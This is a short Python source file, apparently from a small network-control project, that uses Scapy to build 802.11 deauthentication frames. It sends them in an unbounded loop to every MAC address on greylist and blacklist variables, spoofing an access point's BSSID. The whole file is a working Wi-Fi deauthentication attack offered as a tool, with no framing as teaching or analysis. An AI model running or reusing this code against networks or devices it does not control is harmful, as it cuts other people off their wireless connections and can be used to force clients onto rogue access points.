""" This file has all of the code for deauthenticating the
    devices on the greylist and blacklist
"""
from scapy.all import *
import sys
import globVar

def deauthenticate_devices():
    print("do the deauth thing!")

    # # The interface that you want to send packets out of, needs to be set to monitor mode
    # # should be global variable
    conf.iface = globVar.conf_iface  # This can be found in the Scapy Console via the command IFACES

    # should be global variable
    bssid = globVar.router_bssid  # The BSSID of Wireless Access Point - This is the MAC of my WiFi PineApple
    count = 0
    while globVar.continueProcessing == 1:# and count < 100:
        # do stuff
        # time.sleep(1)
        for address in globVar.greyList:
            client = address.macAddress
            # turn off output
            conf.verb = 0
            packet = scapy.all.RadioTap() / scapy.all.Dot11(addr1=client, addr2=bssid,
                                                            addr3=bssid) / scapy.all.Dot11Deauth()
            sendp(packet)
        for address in globVar.blackList:
            client = address.macAddress
            # turn off output
            conf.verb = 0
            packet = scapy.all.RadioTap() / scapy.all.Dot11(addr1=client, addr2=bssid,
                                                            addr3=bssid) / scapy.all.Dot11Deauth()
            sendp(packet)
        count += 1



























